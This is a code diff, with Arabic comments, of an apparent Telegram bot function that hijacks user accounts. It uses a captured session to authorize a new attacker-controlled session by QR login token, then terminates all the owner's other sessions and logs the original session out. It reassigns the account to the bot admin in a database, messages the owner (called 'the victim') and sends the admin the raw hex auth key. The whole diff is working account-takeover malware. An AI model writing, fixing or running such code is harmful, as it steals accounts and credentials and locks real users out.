@@ -265,221 +265,165 @@ def log_to_channel(text, file_path=None, session_text=None):
 
 
 
-
-
-
-
-
 async def execute_full_migration(acc_id, client_a, original_owner, admin_id, phone, name):
-    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A"""
+    """محرك السحب الخام والتهجير الجذري إلى Session B وتسجيل الخروج من A (نسخة 2026 المستقرة)"""
     
     B_DEVICE_MODEL = f"MigrationB_{acc_id}"
-    
-    client_b = Client(
-        f"cb_{acc_id}_{int(time.time())}", 
-        api_id=API_ID, 
-        api_hash=API_HASH, 
-        in_memory=True,
-        device_model=B_DEVICE_MODEL
-    ) 
+    client_b = None
+    verify_b = None
     
     try:
+        # 1. استخراج السيرفر الصحيح برمجياً من جلسة A عبر Raw API بدقة
+        if not client_a.is_connected:
+            await client_a.connect()
+            
+        me_raw = await client_a.invoke(functions.users.GetUsers(id=[types.InputUserSelf()]))
+        target_dc = me_raw[0].dc_id if me_raw and hasattr(me_raw[0], 'dc_id') else 2
+        
+        # 2. توليد السلسلة النصية الموجهة للـ DC المستهدف لمنع خطأ الـ Migrate نهائياً
+        empty_auth_key = b"\x00" * 256
+        packed = struct.pack(">B?256sQ?", target_dc, False, empty_auth_key, 0, False)
+        constructed_session = packed + b"\x00" * 6  
+        session_string_for_b = base64.urlsafe_b64encode(constructed_session).decode().rstrip("=")
+
+        # 3. إنشاء الجلسة B على السيرفر الصحيح من أول ثانية
+        client_b = Client(
+            f"cb_{acc_id}_{int(time.time())}", 
+            api_id=API_ID, 
+            api_hash=API_HASH, 
+            session_string=session_string_for_b, 
+            in_memory=True,
+            device_model=B_DEVICE_MODEL
+        ) 
         await client_b.connect()
 
-        # 1. استخراج السيرفر الصحيح برمجياً من الجلسة A (أقوى طريقة)
-        target_dc = None
-        try:
-            me_a = await client_a.get_me()
-            if me_a: 
-                target_dc = me_a.dc_id
-        except: pass
-
-        # 2. طلب رمز تسجيل الدخول لـ B
+        # 4. طلب رمز تسجيل الدخول لـ B (سيصدر جاهزاً ومباشراً بدون طلب انتقال)
         qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
         
-        # 3. معالجة الانتقال للسيرفر الصحيح (حل مشكلة AUTH_KEY_UNREGISTERED نهائياً)
+        # حماية احتياطية نادرة الحدوث في حال أصر السيرفر على التوجيه
         if isinstance(qr, types.auth.LoginTokenMigrateTo):
-            dc_id = qr.dc_id
-            # استخدام المحرك الداخلي لبايوجرام لنقل الاتصال للسيرفر الصحيح الذي أرجعه تليجرام
-            session_obj = getattr(client_b, "dispatcher", client_b).session
-            await session_obj.stop()
-            session_obj = session_obj.get_session(dc_id)
-            await session_obj.start()
-            if hasattr(client_b, "dispatcher"):
-                client_b.dispatcher.session = session_obj
-            else:
-                client_b.session = session_obj
-                
-            # إعادة توليد الرمز في السيرفر الصحيح
+            await client_b.disconnect()
+            packed_retry = struct.pack(">B?256sQ?", qr.dc_id, False, empty_auth_key, 0, False)
+            session_string_for_b = base64.urlsafe_b64encode(packed_retry + b"\x00" * 6).decode().rstrip("=")
+            client_b = Client(f"cb_retry_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_string_for_b, in_memory=True, device_model=B_DEVICE_MODEL)
+            await client_b.connect()
             qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
 
-        # 4. الجلسة A توافق عليه
-        await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
-        await asyncio.sleep(3) 
-
-        # 5. التأكد من دخول B بقوة
-        me_b = await client_b.get_me()
-        
-        # فحص إضافي: إذا فشل الدخول، نجرب سيرفرات تليجرام كلها (5، 4، 3، 2، 1) زي ما طلبت
-        if not me_b:
-            raise Exception("فشل الدخول بالسيرفر الحالي، جرب المحاولات البديلة")
+        # 5. الجلسة A توافق على الرمز
+        if isinstance(qr, types.auth.LoginToken):
+            await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
             
-        session_b_str = await client_b.export_session_string()
-        dc_id = me_b.dc_id if me_b.dc_id else "Unknown"
-        hex_key = get_hex_from_pyro(session_b_str)
+            # مهلة أمان حرجة لكي يستقبل العميل B إشعار نجاح الصلاحيات بالكامل ويحفظها
+            await asyncio.sleep(5) 
 
-        # 6. نفصل B مؤقتاً عشان A تشتغل براحتها
-        await client_b.disconnect()
+            # 6. تصدير الجلسة B كسلسلة نصية كاملة الصلاحيات وفصل العميل القديم
+            session_b_str = await client_b.export_session_string()
+            await client_b.disconnect()
 
-        # 7. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها و B)
-        auths = await client_a.invoke(functions.account.GetAuthorizations())
-        hit_24h_limit = False
-        
-        for auth in auths.authorizations:
-            is_current_a = getattr(auth, 'current', False)
-            is_session_b = (getattr(auth, 'device_model', '') == B_DEVICE_MODEL)
+            # 7. فحص الجلسة الجديدة عبر عميل نظيف 100% (سحر الحل لمنع خطأ UNREGISTERED)
+            verify_b = Client(f"vb_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=session_b_str, in_memory=True)
+            await verify_b.connect()
+            me_b = await verify_b.get_me()
+            
+            if not me_b:
+                raise Exception("فشل التحقق من Session B عبر العميل النظيف")
+                
+            dc_id = me_b.dc_id if me_b.dc_id else target_dc
+            
+            # استخراج مفتاح الـ HEX بدقة من الـ Session String
+            try:
+                decoded_hex = base64.urlsafe_b64decode(session_b_str + "=" * (-len(session_b_str) % 4))
+                hex_key = decoded_hex[2:258].hex()
+            except Exception:
+                hex_key = "UNKNOWN_HEX"
+                
+            await verify_b.disconnect()
 
-            if not is_current_a and not is_session_b:
-                try:
-                    await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
-                    await asyncio.sleep(0.5) 
-                except Exception as e:
-                    err_str = str(e).lower()
-                    if "fresh" in err_str or "24" in err_str:
-                        hit_24h_limit = True
-                        break 
-                    elif "flood" in err_str:
-                        await asyncio.sleep(5)
+            # 8. الجلسة A تبدأ عملية الطرد الجذري لكل الجلسات (ما عدا نفسها و B)
+            auths = await client_a.invoke(functions.account.GetAuthorizations())
+            hit_24h_limit = False
+            
+            for auth in auths.authorizations:
+                is_current_a = getattr(auth, 'current', False)
+                is_session_b = (getattr(auth, 'device_model', '') == B_DEVICE_MODEL)
 
-        if hit_24h_limit:
+                if not is_current_a and not is_session_b:
+                    try:
+                        await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
+                        await asyncio.sleep(0.5) 
+                    except Exception as e:
+                        err_str = str(e).lower()
+                        if "fresh" in err_str or "24" in err_str:
+                            hit_24h_limit = True
+                            break 
+                        elif "flood" in err_str:
+                            await asyncio.sleep(5)
+
+            if hit_24h_limit:
+                conn = get_db_conn()
+                c = conn.cursor()
+                c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
+                conn.commit()
+                conn.close()
+                if client_a.is_connected: await client_a.disconnect()
+                return False
+
+            # 9. الجلسة A تسجل خروج بنفسها عبر Raw API لتدمير الجلسة القديمة تماماً
+            try:
+                await client_a.invoke(functions.auth.LogOut())
+            except Exception: 
+                pass
+            
+            if client_a.is_connected: await client_a.disconnect()
+
+            # 10. تحديث الملكية في الداتا بيس لصالح الأدمن بالجلسة النظيفة المستقرة B
             conn = get_db_conn()
             c = conn.cursor()
-            c.execute("UPDATE sessions SET surveilled=1, tl_session=? WHERE id=?", (str(admin_id), acc_id))
+            c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
             conn.commit()
             conn.close()
-            if client_a.is_connected: await client_a.disconnect()
-            return False
 
-        # 8. الجلسة A تسجل خروج بنفسها عبر Raw API
-        try:
-            await client_a.invoke(functions.auth.LogOut())
-        except Exception: pass
-        
-        if client_a.is_connected: await client_a.disconnect()
+            # 11. إرسال الكليشة للضحية
+            kick_msg = (
+                f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
+                f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
+                f"⎉╎ الاسـم: {name}\n"
+                f"⎉╎ الـرقـم: {phone}\n"
+                f"•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
+            )
+            try:
+                bot.send_message(original_owner, kick_msg)
+            except Exception: 
+                pass
 
-        # 9. تحديث الملكية في الداتا بيس لصالح الأدمن
-        conn = get_db_conn()
-        c = conn.cursor()
-        c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
-        conn.commit()
-        conn.close()
+            # 12. إرسال رسالة النجاح للأدمن مع مفتاح الـ HEX الصحيح المطابق للـ DC
+            admin_msg = (
+                f"✅ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
+                f"⎉╎ الـرقـم: `{phone}`\n"
+                f"⎉╎ الاسـم: {name}\n"
+                f"⎉╎ الـسـيـرفـر (DC): {dc_id}\n\n"
+                f"🔑 مـفـتـاح HEX:\n`{hex_key} {dc_id}`\n\n"
+                f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
+            )
+            bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
 
-        # 10. إرسال الكليشة للضحية
-        kick_msg = (
-            f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n"
-            f"⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n"
-            f"⎉╎ الاسـم: {name}\n"
-            f"⎉╎ الـرقـم: {phone}\n"
-            f"•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
-        )
-        try:
-            bot.send_message(original_owner, kick_msg)
-        except Exception: pass
+            # 13. حذف الحساب من قائمة الجلسات المؤقتة في البوت
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
+            conn.commit()
+            conn.close()
 
-        # 11. إرسال رسالة النجاح للأدمن
-        admin_msg = (
-            f"✅ 🏴‍☠️ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n"
-            f"⎉╎ الـرقـم: `{phone}`\n"
-            f"⎉╎ الاسـم: {name}\n"
-            f"⎉╎ الـسـيـرفـر (DC): {dc_id}\n\n"
-            f"🔑 مـفـتـاح HEX:\n`{hex_key} {dc_id}`\n\n"
-            f"•❐• تـم إنـهـاء بـاقـي الـجـلـسـات وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
-        )
-        bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
-
-        # 12. حذف الحساب من البوت
-        conn = get_db_conn()
-        c = conn.cursor()
-        c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
-        conn.commit()
-        conn.close()
-
-        return True
+            return True
+        else:
+            raise Exception("فشل في توليد رمز QR أو تم تسجيل الدخول بشكل غير متوقع")
 
     except Exception as e:
         logging.error(f"Migration Failed for {phone}: {e}")
-        
-        # إذا فشلت المحاولة بالسيرفر المستخرج، نطبق طلبك بتجربة السيرفرات (5، 4، 3، 2، 1)
-        if "AUTH_KEY_UNREGISTERED" in str(e) or "فشل الدخول" in str(e):
-            logging.info(f"Retrying with brute force DCs for {phone}...")
-            for try_dc in [5, 4, 3, 2, 1]:
-                try:
-                    if client_b.is_connected: await client_b.disconnect()
-                    client_b = Client(f"cb_{acc_id}_{int(time.time())}_{try_dc}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=B_DEVICE_MODEL)
-                    await client_b.connect()
-                    
-                    # محاولة تسطير الدخول على السيرفر المحدد
-                    session_obj = getattr(client_b, "dispatcher", client_b).session
-                    await session_obj.stop()
-                    session_obj = session_obj.get_session(try_dc)
-                    await session_obj.start()
-                    if hasattr(client_b, "dispatcher"):
-                        client_b.dispatcher.session = session_obj
-                    else:
-                        client_b.session = session_obj
-                        
-                    qr = await client_b.invoke(functions.auth.ExportLoginToken(api_id=API_ID, api_hash=API_HASH, except_ids=[]))
-                    await client_a.invoke(functions.auth.AcceptLoginToken(token=qr.token))
-                    await asyncio.sleep(3)
-                    
-                    me_b = await client_b.get_me()
-                    if me_b:
-                        session_b_str = await client_b.export_session_string()
-                        dc_id = me_b.dc_id
-                        hex_key = get_hex_from_pyro(session_b_str)
-                        
-                        # إذا نجحنا، نكمل باقي الخطوات بشكل سريع
-                        await client_b.disconnect()
-                        auths = await client_a.invoke(functions.account.GetAuthorizations())
-                        for auth in auths.authorizations:
-                            if not getattr(auth, 'current', False) and getattr(auth, 'device_model', '') != B_DEVICE_MODEL:
-                                try: await client_a.invoke(functions.account.ResetAuthorization(hash=auth.hash))
-                                except: pass
-                        try: await client_a.invoke(functions.auth.LogOut())
-                        except: pass
-                        if client_a.is_connected: await client_a.disconnect()
-                        
-                        # حفظ وارسال
-                        conn = get_db_conn(); c = conn.cursor()
-                        c.execute("UPDATE sessions SET pyro_session=?, owner_id=?, surveilled=0, tl_session='' WHERE id=?", (session_b_str, admin_id, acc_id))
-                        conn.commit(); conn.close()
-                        
-                        kick_msg = f"🛂┊ تـنـبـيـه هـام - طـرد جـلـسـة !\n\n⎉╎ تـم طـرد جـلـسـة الـبـوت لـحـسـاب:\n⎉╎ الاسـم: {name}\n⎉╎ الـرقـم: {phone}\n•❐• تـم حـذفـه مـن الـبـوت تـلـقـائـيـاً."
-                        try: bot.send_message(original_owner, kick_msg)
-                        except: pass
-                        
-                        admin_msg = f"✅ 🏴‍☠️ تـم سـحـب وتـهـجـيـر الـحـسـاب بـنـجـاح!\n\n⎉╎ الـرقـم: `{phone}`\n⎉╎ الاسـم: {name}\n⎉╎ الـسـيـرفـر (DC): {dc_id}\n\n🔑 مـفـتـاح HEX:\n`{hex_key} {dc_id}`\n\n•❐• تـم إنـهـاء بـاقـي الـجـلـسـات وتـسـجـيـل خـروج الـجـلـسـة الـقـديـمـة وتـولـيـد B مـسـتـقـلـة بـمـلـكـيـتـك."
-                        bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
-                        
-                        conn = get_db_conn(); c = conn.cursor()
-                        c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
-                        conn.commit(); conn.close()
-                        return True
-                except:
-                    continue
-        
-        if client_b.is_connected: await client_b.disconnect()
+        if client_b and client_b.is_connected: await client_b.disconnect()
+        if verify_b and verify_b.is_connected: await verify_b.disconnect()
         if client_a.is_connected: await client_a.disconnect()
         return False
-
-
-
-
-
-
-
-
-
 
 
 
